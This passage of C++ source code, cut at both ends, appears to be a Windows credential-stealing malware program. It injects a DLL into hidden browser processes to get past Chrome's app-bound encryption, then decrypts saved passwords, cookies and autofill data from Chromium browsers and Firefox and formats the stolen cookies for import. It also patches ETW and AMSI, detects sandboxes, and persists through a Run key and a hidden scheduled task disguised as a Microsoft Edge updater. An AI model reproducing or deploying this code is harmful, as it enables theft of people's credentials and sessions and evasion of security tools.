            if (!plain.empty()) key = UnwrapAbe(plain);
        }
        if (key.size() != 32) { g_dbg += "ABE: " + label + " unresolved\n"; continue; }
        g_abe[label] = key;
        g_dbg += "ABE: " + label + " key ok\n";
    }
}

static bool DropPayload(const std::wstring& name, std::wstring& out) {
    HRSRC r = FindResourceW(NULL, MAKEINTRESOURCEW(DLL_RES_ID), RT_RCDATA_W);
    if (!r) return false;
    DWORD sz = SizeofResource(NULL, r);
    HGLOBAL h = LoadResource(NULL, r);
    if (!h || !sz) return false;
    void* p = LockResource(h);
    if (!p) return false;
    out = TempDir() + L"\\" + name;
    FILE* f = _wfopen(out.c_str(), L"wb");
    if (!f) return false;
    fwrite(p, 1, sz, f);
    fclose(f);
    return true;
}

static DWORD FindBrowserPid(const std::string& image) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe{ sizeof(pe) };
    std::wstring w = A2W(image);
    std::vector<std::pair<int, DWORD>> cand;
    if (Process32FirstW(snap, &pe)) do {
        if (_wcsicmp(pe.szExeFile, w.c_str()) != 0) continue;
        int sc = 50;
        HANDLE p = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe.th32ProcessID);
        if (p) {
            std::wstring cl;
            if (ProcCmdLine(p, cl)) sc = (cl.find(L"--type=") == std::wstring::npos) ? 100 : 10;
            CloseHandle(p);
        }
        cand.push_back({ sc, pe.th32ProcessID });
    } while (Process32NextW(snap, &pe));
    CloseHandle(snap);
    if (cand.empty()) return 0;
    std::sort(cand.begin(), cand.end(), [](const std::pair<int, DWORD>& a, const std::pair<int, DWORD>& b) {
        if (a.first != b.first) return a.first > b.first;
        return a.second < b.second;
    });
    return cand[0].second;
}

static bool LaunchBrowser(const std::string& label) {
    const VendorInfo* vi = VendorFor(label);
    if (!vi) return false;
    for (auto& root : AppRootsFor(label)) {
        if (root.empty()) continue;
        std::wstring exe = root + L"\\" + vi->exe;
        if (!Exists(exe)) continue;
        std::wstring cmd = L"\"" + exe + L"\" --no-startup-window";
        STARTUPINFOW si{ sizeof(si) };
        si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
        PROCESS_INFORMATION pi{};
        if (!CreateProcessW(NULL, (LPWSTR)cmd.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) continue;
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return true;
    }
    return false;
}

static bool InjectDll(DWORD pid, const std::wstring& dll) {
    HANDLE p = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
                           PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid);
    if (!p) p = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_LIMITED_INFORMATION |
                            PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, pid);
    if (!p) return false;
    std::string a = W2A(dll);
    SIZE_T n = a.size() + 1;
    void* mem = VirtualAllocEx(p, NULL, n, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    bool ok = false;
    if (mem) {
        if (WriteProcessMemory(p, mem, a.c_str(), n, NULL)) {
            auto load = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryA");
            HANDLE t = CreateRemoteThread(p, NULL, 0, load, mem, 0, NULL);
            if (t) { WaitForSingleObject(t, 20000); CloseHandle(t); ok = true; }
        }
        VirtualFreeEx(p, mem, 0, MEM_RELEASE);
    }
    CloseHandle(p);
    return ok;
}

static std::vector<uint8_t> AbeViaInject(const std::string& label) {
    std::vector<uint8_t> key;
    const VendorInfo* vi = VendorFor(label);
    if (!vi) return key;
    std::string img = W2A(vi->exe);

    DWORD pid = FindBrowserPid(img);
    if (!pid) {
        if (!LaunchBrowser(label)) { g_dbg += "ABE: no " + label + "\n"; return key; }
        for (int i = 0; i < 40 && !pid; ++i) { Sleep(500); pid = FindBrowserPid(img); }
        if (!pid) { g_dbg += "ABE: launch timeout\n"; return key; }
    }

    std::wstring name = L"a" + A2W(g_run) + L"_" + A2W(label) + L".dll";
    std::wstring dll;
    if (!DropPayload(name, dll)) { g_dbg += "ABE: no payload res\n"; return key; }
    if (!InjectDll(pid, dll)) { g_dbg += "ABE: inject fail pid " + std::to_string(pid) + "\n"; DeleteFileW(dll.c_str()); return key; }
    g_dbg += "ABE: injected pid " + std::to_string(pid) + "\n";

    std::wstring kf   = TempDir() + L"\\abe_" + A2W(g_run) + L"_" + A2W(label) + L".key";
    std::wstring logf = TempDir() + L"\\abe_" + A2W(g_run) + L"_" + A2W(label) + L".log";
    for (int i = 0; i < 80; ++i) {
        if (Exists(kf)) {
            key = ReadVec(kf);
            if (key.size() == 32) { g_dbg += "ABE: " + label + " key via inject\n"; break; }
            key.clear();
        }
        Sleep(250);
    }
    if (key.size() != 32) {
        std::string t = ReadAll(logf);
        if (!t.empty()) g_dbg += "ABE: payload trace " + t + "\n";
    }
    DeleteFileW(kf.c_str());
    DeleteFileW(logf.c_str());
    DeleteFileW(dll.c_str());
    return key;
}

static std::vector<std::vector<uint8_t>> AbcCandidates(const std::wstring& ls, const std::string& label) {
    std::vector<std::vector<uint8_t>> out;
    auto it = g_abe.find(label);
    if (it != g_abe.end() && it->second.size() == 32) { out.push_back(it->second); return out; }

    std::vector<uint8_t> raw = JsonField(ReadAll(ls), "app_bound_encrypted_key");
    if (raw.size() < 40 || memcmp(raw.data(), "APPB", 4) != 0) return out;
    std::vector<uint8_t> blob(raw.begin() + 4, raw.end());

    size_t cut = ls.find_last_of(L'\\');
    std::wstring dir = (cut == std::wstring::npos) ? std::wstring() : ls.substr(0, cut);

    if (IsElevated()) {
        std::vector<uint8_t> dk = AbeViaDpapi(blob);
        if (dk.size() == 32) { out.push_back(dk); return out; }
    }

    std::vector<uint8_t> ik = AbeViaInject(label);
    if (ik.size() == 32) { out.push_back(ik); return out; }

    const VendorInfo* vi = VendorFor(label);
    if (vi) {
        std::vector<uint8_t> mk = KeyFromMemory(W2A(vi->exe), dir);
        if (mk.size() == 32) { out.push_back(mk); return out; }
    }

    std::vector<uint8_t> pk = AbeViaComInPath(blob, label);
    if (pk.size() == 32) out.push_back(pk);

    std::vector<uint8_t> ck = AbeViaCom(blob, label);
    if (ck.size() == 32) out.push_back(ck);
    return out;
}

/* ---------- output ---------- */
static void AddCred(const std::string& label, const std::string& url,
                    const std::string& user, const std::string& pass) {
    if (url.empty() && user.empty()) return;
    if (g_c.nPw == 0) g_c.pw += "# Saved credentials\n\n";
    g_c.pw += "URL      : " + Clean(url) + "\n";
    g_c.pw += "Username : " + Clean(user) + "\n";
    g_c.pw += "Password : " + Clean(pass) + "\n";
    g_c.pw += "Browser  : " + label + "\n";
    g_c.pw += "----------------------------------------\n";
    ++g_c.nPw;
}
static void AddAutofill(const std::string& label, const std::string& field, const std::string& val) {
    if (field.empty() || val.empty()) return;
    if (g_c.nAf == 0) g_c.af += "# Autofill / form data\n\n";
    g_c.af += "[" + label + "] " + Clean(field) + " = " + Clean(val) + "\n";
    ++g_c.nAf;
}
static void AddCookie(const std::string& host, const std::string& name, const std::string& val,
                      const std::string& path, bool secure, bool httpOnly, long long expUnix) {
    if (name.empty()) return;
    if (g_c.nCk == 0) {
        g_c.ck += "# Netscape HTTP Cookie File\n";
        g_c.ck += "# import into Cookie-Editor via Import -> Netscape\n";
        g_c.ck += "# host: " + g_c.host + "  user: " + g_c.user + "\n\n";
    }
    std::string h = Clean(host);
    bool sub = (!h.empty() && h[0] == '.');
    std::string dom = httpOnly ? ("#HttpOnly_" + h) : h;
    g_c.ck += dom + "\t" + (sub ? "TRUE" : "FALSE") + "\t" +
              (path.empty() ? "/" : Clean(path)) + "\t" +
              (secure ? "TRUE" : "FALSE") + "\t" +
              std::to_string(expUnix) + "\t" + Clean(name) + "\t" + Clean(val) + "\n";
    ++g_c.nCk;
}

static void PushAad(std::vector<std::vector<uint8_t>>& a, const std::string& s) {
    if (s.empty()) return;
    std::vector<uint8_t> v(s.begin(), s.end());
    a.push_back(v);
    a.push_back(Hash(BCRYPT_SHA256_ALGORITHM, v));
}
static void BuildPassAads(std::vector<std::vector<uint8_t>>& a,
                          const std::string& url, const std::string& realm) {
    a.push_back({});
    PushAad(a, realm);
    PushAad(a, url);
    size_t sp = url.find("://");
    if (sp != std::string::npos) {
        size_t e = url.find('/', sp + 3);
        if (e != std::string::npos) {
            PushAad(a, url.substr(0, e + 1));
            PushAad(a, url.substr(0, e));
        } else {
            PushAad(a, url + "/");
        }
    }
}
static void BuildCookieAads(std::vector<std::vector<uint8_t>>& a, const std::string& host) {
    a.push_back({});
    std::vector<uint8_t> hv(host.begin(), host.end());
    a.push_back(Hash(BCRYPT_SHA256_ALGORITHM, hv));
    a.push_back(hv);
}

static void GrabLoginDb(const std::wstring& src, const std::string& label, const KeySet& ks) {
    std::wstring ld = Stage(src);
    if (ld.empty()) return;
    sqlite3* db = OpenStaged(ld);
    if (db) {
        sqlite3_stmt* st = NULL;
        const char* q5 = "SELECT origin_url,username_value,password_value,blacklisted_by_user,signon_realm FROM logins";
        const char* q4 = "SELECT origin_url,username_value,password_value,blacklisted_by_user FROM logins";
        bool haveRealm = sqlite3_prepare_v2(db, q5, -1, &st, NULL) == SQLITE_OK;
        if (!haveRealm) {
            st = NULL;
            if (sqlite3_prepare_v2(db, q4, -1, &st, NULL) != SQLITE_OK) st = NULL;
        }
        if (st) {
            while (sqlite3_step(st) == SQLITE_ROW) {
                std::string url  = sqlite3_column_text(st, 0) ? (const char*)sqlite3_column_text(st, 0) : "";
                std::string user = sqlite3_column_text(st, 1) ? (const char*)sqlite3_column_text(st, 1) : "";
                const void* pw = sqlite3_column_blob(st, 2);
                int pwn = sqlite3_column_bytes(st, 2);
                int bl = sqlite3_column_int(st, 3);
                std::string realm;
                if (haveRealm) realm = sqlite3_column_text(st, 4) ? (const char*)sqlite3_column_text(st, 4) : "";
                std::string pass;
                if (pw && pwn > 3) {
                    std::vector<uint8_t> blob((uint8_t*)pw, (uint8_t*)pw + pwn);
                    std::vector<std::vector<uint8_t>> aads;
                    BuildPassAads(aads, url, realm);
                    std::string dec;
                    if (ChromeDecrypt(ks, blob, aads, dec, false)) pass = dec;
                    else { pass = "<undecrypted>"; ++g_c.nUnd; }
                } else if (pw && pwn > 0) {
                    pass.assign((char*)pw, pwn);
                }
                if (bl && user.empty() && pass.empty()) continue;
                AddCred(label, url, user, pass);
            }
            sqlite3_finalize(st);
        }
        sqlite3_close(db);
    }
    Unstage(ld);
}

static void GrabChromeProfile(const std::wstring& prof, const std::string& label, const KeySet& ks) {
    GrabLoginDb(prof + L"\\Login Data", label, ks);
    GrabLoginDb(prof + L"\\Login Data For Account", label + "/Account", ks);

    std::wstring ck = prof + L"\\Network\\Cookies";
    if (!Exists(ck)) ck = prof + L"\\Cookies";
    std::wstring ckd = Stage(ck);
    if (!ckd.empty()) {
        sqlite3* db = OpenStaged(ckd);
        if (db) {
            sqlite3_stmt* st = NULL;
            std::string q = O("SELECT host_key,name,encrypted_value,value,path,expires_utc,is_secure,is_httponly FROM cookies");
            if (sqlite3_prepare_v2(db, q.c_str(), -1, &st, NULL) == SQLITE_OK) {
                while (sqlite3_step(st) == SQLITE_ROW) {
                    std::string host = sqlite3_column_text(st, 0) ? (const char*)sqlite3_column_text(st, 0) : "";
                    std::string name = sqlite3_column_text(st, 1) ? (const char*)sqlite3_column_text(st, 1) : "";
                    const void* ev = sqlite3_column_blob(st, 2);
                    int evn = sqlite3_column_bytes(st, 2);
                    std::string plain = sqlite3_column_text(st, 3) ? (const char*)sqlite3_column_text(st, 3) : "";
                    std::string path  = sqlite3_column_text(st, 4) ? (const char*)sqlite3_column_text(st, 4) : "/";
                    long long exp = sqlite3_column_int64(st, 5);
                    bool sec = sqlite3_column_int(st, 6) != 0;
                    bool ho  = sqlite3_column_int(st, 7) != 0;
                    std::string val = plain;
                    if (val.empty() && ev && evn > 3) {
                        std::vector<uint8_t> blob((uint8_t*)ev, (uint8_t*)ev + evn);
                        std::vector<std::vector<uint8_t>> aads;
                        BuildCookieAads(aads, host);
                        std::string dec;
                        if (ChromeDecrypt(ks, blob, aads, dec, true)) val = dec;
                        else ++g_c.nCkBad;
                    }
                    long long unix = exp > 0 ? (exp / 1000000LL - 11644473600LL) : 0;
                    AddCookie(host, name, val, path, sec, ho, unix);
                }
                sqlite3_finalize(st);
            }
            sqlite3_close(db);
        }
        Unstage(ckd);
    }

    std::wstring wd = Stage(prof + L"\\Web Data");
    if (!wd.empty()) {
        sqlite3* db = OpenStaged(wd);
        if (db) {
            sqlite3_stmt* st = NULL;
            std::string q1 = O("SELECT name,value FROM autofill");
            if (sqlite3_prepare_v2(db, q1.c_str(), -1, &st, NULL) == SQLITE_OK) {
                while (sqlite3_step(st) == SQLITE_ROW) {
                    std::string n = sqlite3_column_text(st, 0) ? (const char*)sqlite3_column_text(st, 0) : "";
                    std::string v = sqlite3_column_text(st, 1) ? (const char*)sqlite3_column_text(st, 1) : "";
                    AddAutofill(label, n, v);
                }
                sqlite3_finalize(st);
            }
            st = NULL;
            std::string q2 = O("SELECT full_name,email,phone,street_address,city,state,postal_code FROM autofill_profiles");
            if (sqlite3_prepare_v2(db, q2.c_str(), -1, &st, NULL) == SQLITE_OK) {
                const char* cols[] = { "full_name", "email", "phone", "street", "city", "state", "zip" };
                while (sqlite3_step(st) == SQLITE_ROW) {
                    for (int i = 0; i < 7; ++i) {
                        std::string v = sqlite3_column_text(st, i) ? (const char*)sqlite3_column_text(st, i) : "";
                        AddAutofill(label, cols[i], v);
                    }
                }
                sqlite3_finalize(st);
            }
            sqlite3_close(db);
        }
        Unstage(wd);
    }
}

static void GrabChromiumFamily() {
    std::wstring local = g_ulocal;
    struct B { std::wstring dir; std::string label; };
    std::vector<B> list = {
        { local + L"\\Google\\Chrome\\User Data", "Chrome" },
        { local + L"\\Microsoft\\Edge\\User Data", "Edge" },
        { local + L"\\BraveSoftware\\Brave-Browser\\User Data", "Brave" },
        { local + L"\\Vivaldi\\User Data", "Vivaldi" },
        { local + L"\\Yandex\\YandexBrowser\\User Data", "Yandex" },
        { g_uroam + L"\\Opera Software\\Opera Stable", "Opera" },
        { g_uroam + L"\\Opera Software\\Opera GX Stable", "OperaGX" },
        { local + L"\\Chromium\\User Data", "Chromium" },
    };
    for (auto& b : list) {
        std::wstring ls = b.dir + L"\\Local State";
        if (!Exists(ls) && !Exists(b.dir + L"\\Default")) continue;
        KeySet ks;
        ks.dpapi = GetDpapiKey(ls);
        auto cands = AbcCandidates(ls, b.label);
        for (auto& c : cands) {
            if (ValidateAbeKey(b.dir, c)) { ks.appBound = c; g_dbg += b.label + ": key validated\n"; break; }
            g_dbg += b.label + ": candidate rejected\n";
        }
        if (ks.dpapi.empty() && ks.appBound.empty()) {
            g_dbg += b.label + ": no keys\n";
            continue;
        }
        g_dbg += b.label + ": dpapi=" + (ks.dpapi.empty() ? "0" : "1") +
                 " appBound=" + (ks.appBound.empty() ? "0" : "1") + "\n";

        bool any = false;
        WIN32_FIND_DATAW fd;
        HANDLE h = FindFirstFileW((b.dir + L"\\*").c_str(), &fd);
        if (h != INVALID_HANDLE_VALUE) {
            do {
                if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
                std::wstring n = fd.cFileName;
                if (n != L"Default" && n.rfind(L"Profile", 0) != 0) continue;
                any = true;
                GrabChromeProfile(b.dir + L"\\" + n, b.label + "/" + W2A(n), ks);
            } while (FindNextFileW(h, &fd));
            FindClose(h);
        }
        if (!any) GrabChromeProfile(b.dir, b.label, ks);
    }
}

/* ---------- Firefox ---------- */
static bool FirefoxKey(const std::wstring& prof, std::vector<uint8_t>& key) {
    std::wstring k4 = Stage(prof + L"\\key4.db");
    if (k4.empty()) return false;
    bool ok = false;
    sqlite3* db = OpenStaged(k4);
    if (db) {
        std::vector<uint8_t> gsalt, blob, esalt;
        sqlite3_stmt* st = NULL;
        if (sqlite3_prepare_v2(db, "SELECT item1 FROM metadata WHERE id='password'", -1, &st, NULL) == SQLITE_OK) {
            if (sqlite3_step(st) == SQLITE_ROW) {
                const void* b = sqlite3_column_blob(st, 0); int n = sqlite3_column_bytes(st, 0);
                if (b && n) gsalt.assign((uint8_t*)b, (uint8_t*)b + n);
            }
            sqlite3_finalize(st);
        }
        st = NULL;
        if (sqlite3_prepare_v2(db, "SELECT a11,a102 FROM nssPrivate", -1, &st, NULL) == SQLITE_OK) {
            if (sqlite3_step(st) == SQLITE_ROW) {
                const void* b = sqlite3_column_blob(st, 0); int n = sqlite3_column_bytes(st, 0);
                if (b && n) blob.assign((uint8_t*)b, (uint8_t*)b + n);
                const void* s = sqlite3_column_blob(st, 1); int sn = sqlite3_column_bytes(st, 1);
                if (s && sn) esalt.assign((uint8_t*)s, (uint8_t*)s + sn);
            }
            sqlite3_finalize(st);
        }
        sqlite3_close(db);
        if (!gsalt.empty() && !blob.empty() && !esalt.empty()) {
            std::vector<uint8_t> hp = Hash(BCRYPT_SHA1_ALGORITHM, gsalt);
            std::vector<uint8_t> k1 = Pbkdf2Sha1(hp, esalt, 1, 24);
            std::vector<uint8_t> iv(esalt.begin(), esalt.begin() + std::min<size_t>(8, esalt.size()));
            std::vector<uint8_t> plain;
            if (!k1.empty() && Des3Dec(k1, iv, blob, plain)) {
                const std::string chk = "password-check";
                if (plain.size() > chk.size() + 24 && memcmp(plain.data(), chk.data(), chk.size()) == 0) {
                    size_t off = chk.size() + 1;
                    key.assign(plain.begin() + off, plain.begin() + off + 24);
                    ok = true;
                }
            }
        }
    }
    Unstage(k4);
    return ok;
}
static std::string FfDecrypt(const std::vector<uint8_t>& key, const std::string& b64) {
    std::vector<uint8_t> blob = B64Dec(b64);
    if (blob.size() < 16) return {};
    std::vector<uint8_t> iv(blob.begin(), blob.begin() + 8);
    std::vector<uint8_t> ct(blob.begin() + 8, blob.end());
    std::vector<uint8_t> plain;
    if (!Des3Dec(key, iv, ct, plain)) return {};
    size_t off = std::string("password-check").size() + 1;
    if (plain.size() <= off) return {};
    return std::string(plain.begin() + off, plain.end());
}
static std::string JVal(const std::string& j, size_t from, const std::string& k) {
    size_t p = j.find("\"" + k + "\"", from);
    if (p == std::string::npos) return {};
    p = j.find('"', j.find(':', p));
    if (p == std::string::npos) return {};
    std::string o;
    for (size_t i = p + 1; i < j.size(); ++i) {
        if (j[i] == '\\' && i + 1 < j.size()) { o += j[i + 1]; ++i; continue; }
        if (j[i] == '"') break;
        o += j[i];
    }
    return o;
}
static void GrabFirefox() {
    std::wstring root = g_uroam + L"\\Mozilla\\Firefox\\Profiles";
    WIN32_FIND_DATAW fd;
    HANDLE h = FindFirstFileW((root + L"\\*").c_str(), &fd);
    if (h == INVALID_HANDLE_VALUE) return;
    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
        std::wstring prof = root + L"\\" + fd.cFileName;
        std::string label = "Firefox/" + W2A(fd.cFileName);

        const wchar_t* stores[2] = { L"\\logins.json", L"\\logins-backup.json" };
        std::vector<uint8_t> key;
        bool haveKey = false;
        for (int s = 0; s < 2; ++s) {
            if (!Exists(prof + stores[s])) continue;
            if (!haveKey) { haveKey = FirefoxKey(prof, key); }
            if (!haveKey) continue;
            std::string j = ReadAll(prof + stores[s]);
            std::set<std::string> seen;
            size_t pos = 0;
            while ((pos = j.find("\"hostname\"", pos)) != std::string::npos) {
                std::string host = JVal(j, pos, "hostname");
                std::string u = FfDecrypt(key, JVal(j, pos, "encryptedUsername"));
                std::string p = FfDecrypt(key, JVal(j, pos, "encryptedPassword"));
                std::string sig = host + "\x01" + u + "\x01" + p;
                if (!host.empty() && seen.insert(sig).second) AddCred(label, host, u, p);
                pos += 10;
            }
        }

        std::wstring ck = Stage(prof + L"\\cookies.sqlite");
        if (!ck.empty()) {
            sqlite3* db = OpenStaged(ck);
            if (db) {
                sqlite3_stmt* st = NULL;
                if (sqlite3_prepare_v2(db, "SELECT host,name,value,path,expiry,isSecure,isHttpOnly FROM moz_cookies", -1, &st, NULL) == SQLITE_OK) {
                    while (sqlite3_step(st) == SQLITE_ROW) {
                        std::string host = sqlite3_column_text(st, 0) ? (const char*)sqlite3_column_text(st, 0) : "";
                        std::string n = sqlite3_column_text(st, 1) ? (const char*)sqlite3_column_text(st, 1) : "";
                        std::string v = sqlite3_column_text(st, 2) ? (const char*)sqlite3_column_text(st, 2) : "";
                        std::string pa = sqlite3_column_text(st, 3) ? (const char*)sqlite3_column_text(st, 3) : "/";
                        long long ex = sqlite3_column_int64(st, 4);
                        bool sec = sqlite3_column_int(st, 5) != 0;
                        bool ho  = sqlite3_column_int(st, 6) != 0;
                        AddCookie(host, n, v, pa, sec, ho, ex);
                    }
                    sqlite3_finalize(st);
                }
                sqlite3_close(db);
            }
            Unstage(ck);
        }
        std::wstring fh = Stage(prof + L"\\formhistory.sqlite");
        if (!fh.empty()) {
            sqlite3* db = OpenStaged(fh);
            if (db) {
                sqlite3_stmt* st = NULL;
                if (sqlite3_prepare_v2(db, "SELECT fieldname,value FROM moz_formhistory", -1, &st, NULL) == SQLITE_OK) {
                    while (sqlite3_step(st) == SQLITE_ROW) {
                        std::string n = sqlite3_column_text(st, 0) ? (const char*)sqlite3_column_text(st, 0) : "";
                        std::string v = sqlite3_column_text(st, 1) ? (const char*)sqlite3_column_text(st, 1) : "";
                        AddAutofill(label, n, v);
                    }
                    sqlite3_finalize(st);
                }
                sqlite3_close(db);
            }
            Unstage(fh);
        }
    } while (FindNextFileW(h, &fd));
    FindClose(h);
}

/* ---------- evasion / persistence ---------- */
static void PatchEtw() {
    HMODULE n = GetModuleHandleW(L"ntdll.dll");
    if (!n) return;
    BYTE* p = (BYTE*)GetProcAddress(n, "EtwEventWrite");
    if (!p) return;
    DWORD o; VirtualProtect(p, 1, PAGE_EXECUTE_READWRITE, &o);
    *p = 0xC3;
    VirtualProtect(p, 1, o, &o);
}
static void PatchAmsi() {
    HMODULE a = LoadLibraryW(L"amsi.dll");
    if (!a) return;
    BYTE* p = (BYTE*)GetProcAddress(a, "AmsiScanBuffer");
    if (!p) return;
    DWORD o; VirtualProtect(p, 8, PAGE_EXECUTE_READWRITE, &o);
    BYTE patch[8] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3, 0x90, 0x90 };
    memcpy(p, patch, 8);
    VirtualProtect(p, 8, o, &o);
}
static bool LooksLikeSandbox() {
    wchar_t buf[256] = {0}; DWORD n = 256;
    GetComputerNameW(buf, &n);
    std::wstring cn = buf;
    const wchar_t* bad[] = { L"SANDBOX", L"MALTEST", L"VIRUS", L"ANALYSIS", L"CUCKOO", L"DESKTOP-" };
    for (auto b : bad) if (cn.find(b) != std::wstring::npos) return true;
    MEMORYSTATUSEX ms{ sizeof(ms) }; GlobalMemoryStatusEx(&ms);
    if (ms.ullTotalPhys < (2ull << 30)) return true;
    if (GetTickCount64() < 8 * 60 * 1000) return true;
    if (IsDebuggerPresent()) return true;
    return false;
}

static std::wstring SelfPath() { wchar_t b[MAX_PATH] = {0}; GetModuleFileNameW(NULL, b, MAX_PATH); return std::wstring(b); }
static std::wstring PersistPath() { return TrustedDir() + L"\\" + PERSIST_NAME; }

static std::wstring BrowserDirTarget() {
    for (auto& r : AppRootsFor("Chrome")) if (Exists(r + L"\\elevation_service.exe")) return r;
    for (auto& r : AppRootsFor("Edge"))   if (Exists(r + L"\\elevation_service.exe")) return r;
    for (auto& r : AppRootsFor("Chrome")) { std::wstring e = r + L"\\chrome.exe"; if (Exists(e)) return r; }
    return {};
}

/* run from inside the browser's Application dir so MaybeTrimProcessPath
   normalises the caller to the value baked into the blob */
static std::vector<uint8_t> AbeViaComInPath(const std::vector<uint8_t>& blob, const std::string& label) {
    std::vector<std::wstring> dsts = AppRootsFor(label);
    std::wstring fb = BrowserDirTarget();
    if (!fb.empty()) dsts.push_back(fb);

    std::wstring dst, exe;
    for (auto& d : dsts) {
        if (d.empty()) continue;
        std::wstring tryExe = d + L"\\" + PERSIST_NAME;
        if (CopyFileW(SelfPath().c_str(), tryExe.c_str(), FALSE)) { dst = d; exe = tryExe; break; }
        tryExe = d + L"\\" + RandName() + L".exe";
        if (CopyFileW(SelfPath().c_str(), tryExe.c_str(), FALSE)) { dst = d; exe = tryExe; break; }
    }
    if (dst.empty()) { g_dbg += "ABE: install dir not writable\n"; return {}; }

    std::wstring bf = TempDir() + L"\\abe_b_" + RandName() + L".bin";
    std::wstring of = TempDir() + L"\\abe_k_" + RandName() + L".bin";
    FILE* f = _wfopen(bf.c_str(), L"wb");
    if (!f) { DeleteFileW(exe.c_str()); return {}; }
    fwrite(blob.data(), 1, blob.size(), f);
    fclose(f);

    std::wstring params = L"--abe-decrypt=\"" + bf + L"\" --label=\"" + A2W(label) + L"\" --out=\"" + of + L"\"";
    std::wstring cmd = L"\"" + exe + L"\" " + params;
    STARTUPINFOW si{ sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi{};
    std::vector<uint8_t> key;
    if (CreateProcessW(NULL, (LPWSTR)cmd.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW,
                       NULL, dst.c_str(), &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 45000);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        key = ReadVec(of);
        if (key.size() != 32) key.clear();
    }
    DeleteFileW(bf.c_str());
    DeleteFileW(of.c_str());
    DeleteFileW(exe.c_str());
    return key;
}

static bool RunKeySet() {
    HKEY k;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, RUN_KEY, 0, KEY_READ, &k)) return false;
    wchar_t v[MAX_PATH * 2] = {0}; DWORD n = sizeof(v), t = 0;
    LSTATUS s = RegQueryValueExW(k, RUN_VALUE, NULL, &t, (LPBYTE)v, &n);
    RegCloseKey(k);
    if (s != ERROR_SUCCESS || t != REG_SZ || n <= 4) return false;
    std::wstring cmd = v;
    size_t a = cmd.find(L'"');
    if (a != std::wstring::npos) {
        size_t b = cmd.find(L'"', a + 1);
        if (b == std::wstring::npos) return false;
        cmd = cmd.substr(a + 1, b - a - 1);
    } else {
        size_t sp = cmd.find(L' ');
        if (sp != std::wstring::npos) cmd = cmd.substr(0, sp);
    }
    if (_wcsicmp(cmd.c_str(), PersistPath().c_str()) != 0 &&
        _wcsicmp(cmd.c_str(), SelfPath().c_str()) != 0) return false;
    return Exists(cmd);
}
static void DropRunKey(const std::wstring& exe) {
    HKEY k;
    if (RegCreateKeyExW(HKEY_CURRENT_USER, RUN_KEY, 0, NULL, 0, KEY_SET_VALUE, NULL, &k, NULL) == ERROR_SUCCESS) {
        std::wstring cmd = L"\"" + exe + L"\" --bg";
        RegSetValueExW(k, RUN_VALUE, 0, REG_SZ, (const BYTE*)cmd.c_str(),
                       (DWORD)((cmd.size() + 1) * sizeof(wchar_t)));
        RegCloseKey(k);
    }
}

static const GUID MY_IID_IBootTrigger =
    { 0x2A9C35DA, 0xD357, 0x41F4, { 0xBB, 0xC1, 0x20, 0x7A, 0xC1, 0xBE, 0xD1, 0xCB } };
struct MyIBootTrigger : public ITrigger {
    virtual HRESULT STDMETHODCALLTYPE get_Delay(BSTR* pbstrDelay) = 0;
    virtual HRESULT STDMETHODCALLTYPE put_Delay(BSTR bstrDelay) = 0;
};
static const CLSID MY_CLSID_TaskScheduler =
    { 0x0f87369f, 0xa4e5, 0x4cfc, { 0xbd, 0x3e, 0x73, 0xe6, 0x15, 0x45, 0x72, 0xdd } };
static const IID MY_IID_ITaskService =
    { 0x2faba4c7, 0x4da9, 0x4013, { 0x96, 0x97, 0x20, 0xcc, 0x3f, 0xd4, 0x0f, 0x85 } };
static const IID MY_IID_IExecAction =
    { 0x4c3d624d, 0xfd6b, 0x49a3, { 0xb9, 0xb7, 0xcb, 0x09, 0xf0, 0x50, 0xe6, 0xbb } };

static bool InstallTask(const std::wstring& exe) {
    bool ok = false;
    VARIANT v; VariantInit(&v);
    ITaskService* svc = NULL;
    if (SUCCEEDED(CoCreateInstance(MY_CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, MY_IID_ITaskService, (void**)&svc)) && svc) {
        if (SUCCEEDED(svc->Connect(v, v, v, v))) {
            ITaskDefinition* def = NULL;
            if (SUCCEEDED(svc->NewTask(0, &def)) && def) {
                IRegistrationInfo* ri = NULL;
                if (SUCCEEDED(def->get_RegistrationInfo(&ri)) && ri) {
                    BSTR a = SysAllocString(L"Microsoft Corporation"); ri->put_Author(a); SysFreeString(a);
                    BSTR d = SysAllocString(L"Keeps Microsoft Edge and related components current.");
                    ri->put_Description(d); SysFreeString(d);
                    ri->Release();
                }
                ITaskSettings* ts = NULL;
                if (SUCCEEDED(def->get_Settings(&ts)) && ts) {
                    ts->put_StartWhenAvailable(VARIANT_TRUE);
                    ts->put_DisallowStartIfOnBatteries(VARIANT_FALSE);
                    ts->put_StopIfGoingOnBatteries(VARIANT_FALSE);
                    ts->put_RunOnlyIfIdle(VARIANT_FALSE);
                    ts->put_Hidden(VARIANT_TRUE);
                    BSTR lim = SysAllocString(L"PT0S"); ts->put_ExecutionTimeLimit(lim); SysFreeString(lim);
                    ts->Release();
                }
                IPrincipal* pr = NULL;
                if (SUCCEEDED(def->get_Principal(&pr)) && pr) {
                    pr->put_LogonType(TASK_LOGON_INTERACTIVE_TOKEN);
                    pr->put_RunLevel(TASK_RUNLEVEL_HIGHEST);
                    pr->Release();
                }
                ITriggerCollection* tc = NULL;
